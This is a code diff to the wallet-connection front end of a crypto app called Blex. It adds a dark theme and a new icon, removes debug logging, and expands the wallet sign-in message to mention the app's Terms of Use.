@@ -183,10 +183,11 @@ const web3Onboard = init({
       rpcUrl: "https://mainnet.base.org",
     },
   ],
+  theme: "dark",
   appMetadata: {
     name: "Blex",
     description: "Your App Description",
-    icon: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADoAAAA4CAYAAACsc+sjAAAAAXNSR0IArs4c6QAABBFJREFUaEPtmM9rXFUUx8+dlzCZmRiwYu1GsYvBX23T2iQFcaGWirgSBPcGsUnbFH9QM800qWIhmdEM8R/o1pUWd0oXYrW1mczkR2MLbtx1pVBKrea9e37IfUMlEZpk+s4zk+Q9GAZm7jvvfM73nO+9PAPb5DLbhBMS0K2mdKJoougmrUDSuptUuPumnSiaKLpJK6DWuh99eO5PD3ZkYY3DVqrNACMCyV0oV4ZT/1fd1ECLhfIiY/Y5kHWHNACO08iOR823pwpHX48Tet1ZrZVEsVBeYMzubQJ0RUgRhonKUGwKK4KW5hlz+x4UtEFtYHzyWCyweqDDpTmmXHc0UAAkgs+mTqrDaoLOMuX2RwV1unZ2Qb149njvWuPSzP+aoHWm3AEN0DhaWA30TKFcI8w+rwHKQlCq6LavGmjxdGmGbe6gBigYhlf6nn74yFtHbjfTnqutVQM9UyhXCbM9WqD5J3KP9Z/s/73lQEcKE1XBTjXQ8c9191Q1RYunS9Nsc70ainqeB+fKA6pbTEuC+ngbKl+MbHFQScN45R1VyMaZS+kqDpemmaK37s5d7eX3T71bUErr3zAtBJqCdNa/8PGn772pDamt6AxTuI8uL56snrTrUAZjPHj76OFMPp/3D71wmLse6rp18bsLj2gCqyk6Upj4VbAz34zrtrV7sPvJXXv6B9644aD6XnyVPWgHZATBAGrV79VmVQ00SvVfevk1ZkmDiACzAIoFQgRhC/XqDyqwaqAijVcLxphV29WtO3/+y+rXX31zUNgDY9Lwl70DhBZYBGQZqCUL7R5B7epPkWHVQE8MjF1nzD4ToDUiBEQExEvAzOHHWgsCCMwIAQXuN3FrBBisgySCwM2r5VBRCe9zMXxYqF1pHdChwdGq9TM9JAgsDiwAAAQil7CAtf5/QcNirAbqXq+4AhnDvFC/3BZlPDQVrWPQcSAOUBELi3NXI6mqBzo4Nod+R7cDJXZKErgENRSlFMP12uWtD4qG4EY92pxqK7qfBEVbUfYEfpmJ5rzqoAwk5NySXPv6oRGFeyMGwGJD10V07stg2Tnx/V33nhll0ubm9M+XHm8RMxqdxyDTrQuKxlor12ajzafqWXdocGzB+h37FEGNCIII/z1bvZSNoqYq6InBsUX0O/awsULkWtWucN0mW9e4AwNaX+brP0Zy23sF0pvRY6PXcCmzNyKoMZYAhSAFLNNXLqpAKis6+hv6md1sGnunM5zl++h6FU2hSF/Psx9MTZWnorbr8vv1FB345K4N0lkyjcPCSlACDB3YHQctIDVcl8i1t7hvCewSHOp9aufk5OQfmoDqrRtHcpox1RTVTCqOWAloHFXdyJiJohtZ/TienSgaR1U3Mmai6EZWP45nbxtF/wFadSV1KYAmpgAAAABJRU5ErkJggg==",
+    icon: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADgAAAA4CAYAAACohjseAAAAAXNSR0IArs4c6QAABJZJREFUaEPtmM9vG0UUx9+s47RxUheqNlRCFIkfqoQQqLvLAedSC6XZdXeLhETvnJDgxqkHigSCAydOcOif4Fuz63rTqFhIleDgTSgoAgGVEEJCkCBK0vwwjvehTbNhMpn9vbZDtb7ZMzvzPu/7fW/GS+Ah/5CHnA9ywP+7wrmCuYKHPAO5RQ+5QKHh5QqGpuiQTxiogpZpo5sPRZMGtu9ANvLAPLE9QPr3fkH3BfD29e+P3S+sr7LuRSQVVRe/ZIFpVZuGvazq0qmsnJ85YBS12OBd9fyeSwuaGWAcMNqOPDVHoPh0F7vXVF2cBiA7dZv0kxrQDRABf1A1+SwdhJ8N3d83u8KjY0Xnr0EomRqQDtIw2qUiIev0bwjkVVUTZ3nAdO2FjQ9NQXfjG7Pt9wSBvM92Sfd7WOC8cURYKRDhLQecOm/NOLCpFLRM21WrhAhfqLp0PqpF3XkIsEEASt4zjlA+Wqs92wlLSBw4d24iQDcI3rllzd4RQdi26SB4Z15cpdNcEBIBslmks46IH6q6fNWbE6aIfzNqXwUgH9B7ESA3ZjTxYhwVUwH6ZbbVWDrdwa3fonRJVk2/hOzY2nHeUS+99EnfAX0tunvX9AIon5gsVSpPbPo1m7DzkBD4e+ai9AgNXRgRtGnlXCMqZCoFeTakg261liY661trbDAIsKJqD65jrGII8KaqSdeaZvs2ATLFc0FUuMRNhgVjG47VsDcB4ei++imOTMD6/fGZ16b+aJr2XQLwlDd+8jSOyrLcDTtWkjSbRApapu0omiQENRt3jOqgDtuxDySFsbf3fL3emiiXyvtcEOefRyLAILCwuvIC37MmwjdA4AVOs+kAwCjPjgMD3A1yWdGkSToQXid0BDJZq4nLQX+VDoVF6/Wl0XJ564yiSD9FtWhQ4KQ4ega7//zip9Rcw55DhAv0+MAUDOuic+ad5xG2v2WCd29BQpILwO46G4omjUftpIlrcH7+7vFe5949QcCZCzX5ZohFP1I06d2oFuQcK58BIS8SxKk46iU6JizD/l3Rpcd4GQx6xxJUe7yx1Q1x5PJl0gur2TAlEyvIU4x7AWfavzenadpLBOA5v9oLs3AYmDeeCjDgyvYzADz5YBPcVjS5yKvXvSAR/1R0+eR/ULgGQI6xR0dUKHpebEDLsN9WdOnTIIs6DrxcuyR9FVSXR8YnTlWrZ1duGV8/3iW9X9n1snq1GBvQD8yv+P3qsmm0NwghY+x6R5ZXx6pvVLfS1l4mFvWzzLyxeL5HnJY7HvVK5ncx560Rx6qZKMjWV5xmY5kLNwFwen/Q5GNFE6/EAfGbmwmgX7Nhzr3vFE3a65pBXbJpLr5Odl84xT33WNBMAA8czIjCXGOhF0VJRFxTdblsmfY2ABT8mk1SNTMFtMz2oqLJ54I6LFtTltn+HIBU6WfKJzqlSqWy8yYg7SdTwCCwA83muv0MFODHrBUbiEXdTZrGwiuqLt6Ko2ZatXjP911BetOgZtQPOHfNgQL2CyJo3RxwGFnPcs9cwSyzOYy1cgWHkfUs98wVzDKbw1grV3AYWc9yz38BAy1kVz8lNEUAAAAASUVORK5CYII=",
   },
 });
 const usdtContractAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7";
@@ -218,7 +219,6 @@ let routz = () => {
         appId: "xbot",
       })
       .then((res) => {
-        console.log(res);
         if (res.data.status == "success") {
           router.push("/airdrop");
           logari.value = "1";
@@ -361,7 +361,12 @@ let xiqian = (index, val) => {
 let sgin = async () => {
   const accounts = await ethereum.request({ method: "eth_accounts" });
   const from = accounts[0];
-  const msg = `wallet connect`;
+  const msg = `
+Welcome to Blex!
+
+Click "Sign" to sign in and accept the Blex Terms of Use(https://blex.finance/#/terms).
+
+This request will not trigger a blockchain transaction or cost any gas fees.`;
   const signatures = await ethereum.request({
     method: "personal_sign",
     params: [msg, from],
@@ -381,7 +386,6 @@ let sgin = async () => {
     );
     const balance = await usdtContract.balanceOf(xhladdress.value);
     xusdtbalance.value = ethers.utils.formatEther(balance);
-    console.log("balance", xethbalance.value, xusdtbalance.value);
     localStorage.setItem("xhlbalance", xethbalance.value);
     localStorage.setItem("xhlusdtbalance", xusdtbalance.value);
     bus.$emit("qbbalance", xethbalance.value);
@@ -414,7 +418,6 @@ let firstlogin = () => {
       if (res.data.status == "success") {
         localStorage.setItem("user", JSON.stringify(res.data.data));
         userlog.value = res.data.data;
-        console.log(userlog.value.userId, userlog.value.token);
         lgetuser();
       }
     })
